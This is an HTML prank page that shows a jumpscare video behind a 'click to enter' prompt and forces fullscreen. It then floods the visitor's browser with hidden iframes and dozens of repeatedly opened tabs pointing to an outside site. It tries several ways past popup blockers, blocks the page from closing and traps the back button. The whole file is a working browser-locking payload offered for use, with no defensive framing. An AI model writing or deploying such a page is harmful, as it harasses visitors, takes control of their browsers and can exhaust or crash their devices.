<!DOCTYPE html>
<html lang="en">
<head>
   <style>
    * { margin: 0; padding: 0; }
    body, html {
      width: 100%;
      height: 100%;
      background: black;
      cursor: pointer;
      overflow: hidden;
    }
    #scareVideo {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 999;
      object-fit: cover;
    }
    #scareVideo::-webkit-media-controls { display: none !important; }
    #scareVideo::-moz-media-controls { display: none !important; }
    video::-ms-media-controls { display: none !important; }
    video::-o-media-controls { display: none !important; }
    video { pointer-events: none; }

    #overlayText {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: "Comic Sans MS", cursive, sans-serif;
      color: white;
      font-size: 5em;
      text-align: center;
      z-index: 1000;
    }

    #trapFrame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1001;
      display: none;
      border: none;
      background: white;
    }

    .miniFrame {
      position: fixed;
      width: 100px;
      height: 100px;
      border: none;
      z-index: 9999;
      opacity: 0.1;
      pointer-events: none;
    }
  </style>
</head>
<body>

  <div id="overlayText">click to enter..</div>
  
  <video id="scareVideo" loop>
    <source src="jumpscare.mp4" type="video/mp4">
  </video>

  <iframe id="trapFrame" src="https://loganexotic.github.io/zakusone/"></iframe>

  <script>
    const pageBody = document.body;
    const video = document.getElementById('scareVideo');
    const overlayText = document.getElementById('overlayText');
    const trapFrame = document.getElementById('trapFrame');
    const url = 'https://loganexotic.github.io/zakusone/';
    let triggered = false;
    let fullscreenExited = false;

    function forceOpenTabs(count) {
      for (let i = 0; i < count; i++) {
        // Method 1: Standard window.open
        try {
          const win = window.open(url, '_blank');
          if (!win || win.closed) {
            // Method 2: Try with different window name
            window.open(url, 'tab_' + Date.now() + '_' + Math.random());
          }
        } catch(e) {}

        // Method 3: Click a hidden link
        try {
          const a = document.createElement('a');
          a.href = url;
          a.target = '_blank';
          a.rel = 'noopener noreferrer';
          document.body.appendChild(a);
          a.click();
          setTimeout(() => document.body.removeChild(a), 50);
        } catch(e) {}

        // Method 4: Use window.open with features
        try {
          window.open(url, '_blank', 'width=1024,height=768,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes');
        } catch(e) {}
      }
    }

    function spawnMiniIframes(count) {
      for (let i = 0; i < count; i++) {
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.className = 'miniFrame';
        iframe.style.left = Math.random() * window.innerWidth + 'px';
        iframe.style.top = Math.random() * window.innerHeight + 'px';
        iframe.style.width = (50 + Math.random() * 200) + 'px';
        iframe.style.height = (50 + Math.random() * 200) + 'px';
        iframe.style.opacity = Math.random() * 0.3;
        document.body.appendChild(iframe);
      }
    }

    pageBody.addEventListener('click', () => {
      if (triggered) return;
      triggered = true;

      overlayText.style.display = 'none';
      video.style.display = 'block';
      video.play();

      const elem = document.documentElement;
      if (elem.requestFullscreen) elem.requestFullscreen();
      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();

      // Spawn iframes in background
      for (let i = 0; i < 30; i++) {
        setTimeout(() => spawnMiniIframes(10), i * 100);
      }

      // Open some tabs immediately too
      setTimeout(() => forceOpenTabs(5), 100);

    }, { once: true });

    // THIS IS THE KEY PART - When they exit fullscreen, open REAL tabs
    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement && triggered) {
        fullscreenExited = true;
        
        // Show the trap iframe
        trapFrame.style.display = 'block';
        video.style.display = 'none';

        // OPEN REAL TABS - 20 tabs immediately
        forceOpenTabs(20);
        
        // Open more after delays
        setTimeout(() => forceOpenTabs(15), 300);
        setTimeout(() => forceOpenTabs(15), 600);
        setTimeout(() => forceOpenTabs(15), 1000);
        setTimeout(() => forceOpenTabs(15), 1500);
        setTimeout(() => forceOpenTabs(20), 2000);
        setTimeout(() => forceOpenTabs(25), 3000);

        // Keep opening tabs every few seconds
        setInterval(() => {
          forceOpenTabs(10);
        }, 3000);

        // Spawn massive iframes
        for (let i = 0; i < 20; i++) {
          setTimeout(() => spawnMiniIframes(20), i * 50);
        }

        // Try to redirect the main window too
        try {
          window.location.href = url;
        } catch(e) {}
      }
    });

    // Also detect webkit fullscreen exit
    document.addEventListener('webkitfullscreenchange', () => {
      if (!document.webkitFullscreenElement && triggered) {
        fullscreenExited = true;
        trapFrame.style.display = 'block';
        video.style.display = 'none';
        forceOpenTabs(20);
        setTimeout(() => forceOpenTabs(15), 500);
        setTimeout(() => forceOpenTabs(15), 1000);
        setInterval(() => forceOpenTabs(10), 3000);
      }
    });

    // Prevent closing
    window.addEventListener('beforeunload', (e) => {
      if (triggered) {
        e.preventDefault();
        e.returnValue = '';
        forceOpenTabs(10);
        return '';
      }
    });

    // Trap back button
    window.addEventListener('popstate', () => {
      if (triggered) {
        forceOpenTabs(10);
        window.history.pushState(null, '', window.location.href);
      }
    });

    window.history.pushState(null, '', window.location.href);

    console.log('🔥 Click to start - REAL TABS will open when you exit fullscreen!');
  </script>

</body>
</html>
